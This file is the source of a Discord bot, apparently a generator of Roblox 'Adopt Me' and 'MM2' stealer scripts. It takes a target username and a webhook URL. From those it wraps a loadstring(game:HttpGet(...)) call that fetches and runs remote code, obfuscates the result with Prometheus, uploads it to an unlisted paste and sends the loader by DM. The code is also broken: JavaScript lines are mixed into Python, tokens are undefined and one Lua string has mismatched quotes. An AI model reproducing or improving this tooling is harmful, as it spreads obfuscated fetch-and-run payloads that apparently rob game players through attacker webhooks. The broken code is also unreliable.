import discord
from discord.ext import commands
from discord import app_commands
import subprocess
import secrets
import os
import requests
from typing import Optional

console.log('Environment variables loaded:');
console.log('BOT_TOKEN:', process.env.BOT_TOKEN ? 'Found' : 'Missing');
console.log('PASTEFY_TOKEN:', process.env.PASTEFY_TOKEN ? 'Found' : 'Missing');

const token = process.env.BOT_TOKEN;
const pastefy = process.env.PASTEFY_TOKEN;

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

def upload_to_pastefy(title: str, content: str) -> str:
    url = "https://pastefy.app/api/v2/paste"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-API-KEY": PASTEFY_TOKEN,
    }

    data = {
        "type": "PASTE",
        "title": title,
        "content": content,
        "visibility": "UNLISTED",
        "encrypted": False,
    }

    response = requests.post(url, headers=headers, json=data)
    response.raise_for_status()
    resp_json = response.json()
    paste_url = resp_json.get("paste", {}).get("raw_url")
    if not paste_url:
        raise Exception("Error Try again!")
    return paste_url

class CopyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Copy ✉️", style=discord.ButtonStyle.primary, custom_id="copy_code_button")
    async def callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            embed = interaction.message.embeds[0]
            raw_value = embed.fields[0].value

            if raw_value.startswith("```lua"):
                code = raw_value[6:]
            elif raw_value.startswith("```"):
                code = raw_value[3:]
            else:
                code = raw_value

            if code.endswith("```"):
                code = code[:-3]

            code = code.strip()
            await interaction.response.send_message(content=code, ephemeral=True)
        except Exception:
            await interaction.response.send_message("Error Try again!", ephemeral=True)

@tree.command(name="gen_adoptme", description="Set up Adopt Me Script")
async def show_adoptme_form(interaction: discord.Interaction):
    class AdoptMeModal(discord.ui.Modal, title="Adopt Me Script Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="Main Target Username")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Your Webhook URL", required=False)

        async def on_submit(self, interaction: discord.Interaction):
            await interaction.response.defer(ephemeral=True)
            try:
                lua_code = f'''
Username = "{self.username.value}"
Webhook = "{self.webhook.value}"

loadstring(game:HttpGet("https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua"))()
'''

                filename = f"{secrets.token_hex(8)}.lua"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(lua_code)

                subprocess.run(["lua", "./Prometheus/cli.lua", "--preset", "Medium", filename], check=True)
                obf_file = filename.replace(".lua", ".obfuscated.lua")
                if not os.path.exists(obf_file):
                    raise Exception("Obfuscation failed.")

                with open(obf_file, "r", encoding="utf-8") as f:
                    obf_content = f.read()

                paste_url = upload_to_pastefy("discord.gg/F3bb3e8VBe", obf_content)
                final_script = f'```lua\nloadstring(game:HttpGet("{paste_url}", true))()\n```'

                embed = discord.Embed(
                    title="Adopt Me Script Generated",
                    description="This script is generated exclusively for you",
                    color=discord.Color.gold()
                )
                embed.set_thumbnail(
                    url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682f91eb&is=682e406b&hm=c145392b83a74694b25dcb11d4addf082d08cd10af4571a61174ba2450c816c9&"
                )
                embed.add_field(name="Script", value=final_script, inline=False)
                embed.set_footer(text="Made By Pethical 🎉")

                view = CopyButton()
                try:
                    await interaction.user.send(embed=embed, view=view)
                    await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
                except:
                    await interaction.followup.send("Failed to send DM. Check your DM settings.", ephemeral=True)
            except Exception:
                await interaction.followup.send("Error Try again!", ephemeral=True)
            finally:
                for file in [filename, obf_file]:
                    if os.path.exists(file):
                        os.remove(file)

    await interaction.response.send_modal(AdoptMeModal())

# GEN MM2 MODAL
@tree.command(name="gen_mm2", description="Set up MM2 Script")
async def show_mm2_form(interaction: discord.Interaction):
    class Mm2Modal(discord.ui.Modal, title="MM2 Script Setup"):
        username = discord.ui.TextInput(label="Username", placeholder="Target Username")
        webhook = discord.ui.TextInput(label="Webhook", placeholder="Your Webhook URL", required=False)

        async def on_submit(self, interaction: discord.Interaction):
            await interaction.response.defer(ephemeral=True)
            try:
                lua_code = f'''
Username = "{self.username.value}"
Webhook = "{self.webhook.value}"

loadstring(game:HttpGet('https://raw.githubusercontent.com/SharScript/MM2/refs/heads/main/Protected_MM2.lua"))()
'''

                filename = f"{secrets.token_hex(8)}.lua"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(lua_code)

                subprocess.run(["lua", "./Prometheus/cli.lua", "--preset", "Medium", filename], check=True)
                obf_file = filename.replace(".lua", ".obfuscated.lua")
                if not os.path.exists(obf_file):
                    raise Exception("Obfuscation failed.")

                with open(obf_file, "r", encoding="utf-8") as f:
                    obf_content = f.read()

                paste_url = upload_to_pastefy("discord.gg/F3bb3e8VBe", obf_content)
                final_script = f'```lua\nloadstring(game:HttpGet("{paste_url}", true))()\n```'

                embed = discord.Embed(
                    title="MM2 Script Generated",
                    description="This script is generated exclusively for you",
                    color=discord.Color.green()
                )
                embed.set_thumbnail(
                    url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682f91eb&is=682e406b&hm=c145392b83a74694b25dcb11d4addf082d08cd10af4571a61174ba2450c816c9&"
                )
                embed.add_field(name="Script", value=final_script, inline=False)
                embed.set_footer(text="Made By Pethical 🎉")

                view = CopyButton()
                try:
                    await interaction.user.send(embed=embed, view=view)
                    await interaction.followup.send(f"Check your DMs, {interaction.user.mention}!", ephemeral=True)
                except:
                    await interaction.followup.send("Failed to send DM. Check your DM settings.", ephemeral=True)
            except Exception:
                await interaction.followup.send("Error Try again!", ephemeral=True)
            finally:
                for file in [filename, obf_file]:
                    if os.path.exists(file):
                        os.remove(file)

    await interaction.response.send_modal(Mm2Modal())

# READY
@bot.event
async def on_ready():
    await tree.sync()
    await bot.change_presence(activity=discord.Game(name=".gg/F3bb3e8VBe"))
    print(f"✅ Bot is online as {bot.user}")

bot.run(BOT_TOKEN)
